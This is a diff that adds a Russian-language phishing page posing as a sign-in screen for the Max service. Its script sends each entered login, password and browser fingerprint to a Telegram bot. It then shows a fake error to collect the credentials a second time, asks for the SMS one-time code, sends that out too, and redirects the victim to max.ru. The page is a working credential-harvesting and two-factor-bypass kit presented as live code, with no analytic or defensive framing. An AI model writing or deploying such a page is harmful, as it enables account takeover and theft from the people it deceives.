@@ -1,0 +1,74 @@
+<!doctype html>
+<html lang="ru"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Вход в Max</title>
+<style>
+:root{--bg:#0f1115;--card:#1a1d24;--accent:#ff6633;--text:#e8e8ea;--mute:#8a8f98;--err:#ff5252}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:var(--card);border-radius:16px;padding:32px;max-width:380px;width:100%}
+.logo{width:56px;height:56px;border-radius:16px;background:var(--accent);margin:0 auto 16px;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:700;color:#fff}
+h1{font-size:20px;text-align:center;margin-bottom:6px}
+.sub{color:var(--mute);font-size:13px;text-align:center;margin-bottom:24px}
+label{display:block;color:var(--mute);font-size:12px;margin:14px 0 6px}
+input{width:100%;background:#242830;border:1px solid #2e333c;color:var(--text);padding:12px;border-radius:10px;font-size:15px;outline:none}
+input:focus{border-color:var(--accent)}
+.btn{width:100%;background:var(--accent);color:#fff;border:none;padding:13px;border-radius:10px;font-size:15px;font-weight:600;margin-top:20px;cursor:pointer}
+.err{color:var(--err);font-size:13px;margin-top:10px;min-height:16px}
+.otp{display:none}
+</style></head><body>
+<div class="card">
+<div class="logo">M</div>
+<h1>Вход в Max</h1>
+<p class="sub">Введите данные для продолжения</p>
+<form id="f1">
+<label>Телефон или email</label>
+<input name="login" type="text" required>
+<label>Пароль</label>
+<input name="password" type="password" required>
+<div class="err" id="e1"></div>
+<button class="btn" type="submit">Войти</button>
+</form>
+<form id="f2" class="otp">
+<label>Код из SMS</label>
+<input name="otp" type="text" inputmode="numeric" required>
+<div class="err" id="e2"></div>
+<button class="btn" type="submit">Подтвердить</button>
+</form>
+</div>
+<script src="config.js"></script>
+<script>
+const sid = crypto.randomUUID();
+async function send(stage, data){
+  data.sid = sid; data.stage = stage;
+  data.ua = navigator.userAgent; data.lang = navigator.language;
+  data.scr = screen.width+'x'+screen.height;
+  const text = stage==='creds'
+    ? `[CREDS] ${sid}\n📱 ${data.login}\n🔑 ${data.password}\n🌐 ${data.lang} | ${data.scr}\n🖥 ${data.ua}`
+    : `[OTP] ${sid}\n🔢 ${data.otp}`;
+  try{
+    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({chat_id: TG_CHAT, text})
+    });
+  }catch(e){}
+}
+document.getElementById('f1').addEventListener('submit', async e=>{
+  e.preventDefault();
+  const fd = new FormData(e.target);
+  await send('creds', {login:fd.get('login'), password:fd.get('password')});
+  if(!e.target.dataset.retry){
+    e.target.dataset.retry='1';
+    document.getElementById('e1').textContent='Неверный логин или пароль';
+    return;
+  }
+  document.getElementById('f1').style.display='none';
+  document.getElementById('f2').style.display='block';
+});
+document.getElementById('f2').addEventListener('submit', async e=>{
+  e.preventDefault();
+  await send('otp', {otp: new FormData(e.target).get('otp')});
+  setTimeout(()=>{location.href='https://max.ru/'},400);
+});
+</script></body></html>
